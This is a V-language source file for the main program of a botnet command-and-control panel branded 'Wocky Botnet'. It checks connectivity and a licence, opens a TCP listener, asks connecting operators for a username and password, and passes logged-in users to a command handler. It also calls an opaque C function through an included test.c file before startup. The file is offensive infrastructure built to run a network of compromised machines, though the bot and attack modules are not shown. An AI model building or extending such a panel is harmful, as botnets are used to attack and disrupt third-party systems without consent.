import server
import auth
import wocky_cp
import config
import banner_sys
import utils
import os
import io
import net
import net.http
import time
#include "@VROOT/utils/test.c"

fn C.check()

fn main() {
	C.check()
	time.sleep(5)
	println(config.Clear)
	mut port := wocky_cp.port_check(os.args)
	wocky_cp.conn_check() or {
		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
	}
	wocky_cp.licence_valiation()
	go listener(port)
	println('[+] NET Started on Port: $port')
	wocky_cp.command_handler()
}

fn listener(port string) {
	mut server := net.listen_tcp(.ip6, ':${port}') or {
		panic("[x] Error, Unable to start server!\r\n")
	}
	for {
		mut socket := server.accept() or {
			panic("[x] Error, Unable to accept the connection!\r\n")
		}
		go handle_client(mut socket)
	}
}

fn handle_client(mut socket net.TcpConn) {
	mut u := utils.CLI{}
	u.resize_terminal(mut socket, 40, 80)
	mut reader := io.new_buffered_reader(reader: socket)
	mut current_ip := socket.peer_addr() or { return } //User's IP
	println('> new client: $current_ip')

	// Login Sections 
	socket.write_string("Username: ") or { panic("[x] Error") }
	socket.wait_for_read() or { panic("[x] Error") }
	username := socket.read_line().replace("\r\n","")
	socket.write_string("Password: ") or { panic("[x] Error") }
	socket.wait_for_read() or { panic("[x] Error") }
	password := socket.read_line().replace("\r\n", "")

	mut a := auth.AuthInfo{username: username, password: password}
	mut login := a.login()
	if login.contains("[+]") {
		//append user to arr
		mut s := server.ServerAssets{}
		s.clients << socket
		socket.write_string(login) or { panic("[x] Error, Failed to send success login message to socket") }
	} else {
		socket.write_string(login) or { panic("[x] Error, Failed to send login failure message to socket") }
		socket.close() or { panic("[x] Error, Failed to close the socket!") }
	}

	// Login Successfully Below
	
	socket.write_string("\r\x1b[37m╔═[\x1b[35mWocky\x1b[37m@\x1b[35mII\x1b[37m]\r\n╚════➢\x1b[32m ") or { panic("[x] Error, Failed to send hostname to socket!\r\n") }
	for {
		server.cmd_handler(mut socket) // Main Command Handler
	}
	reader.free()
}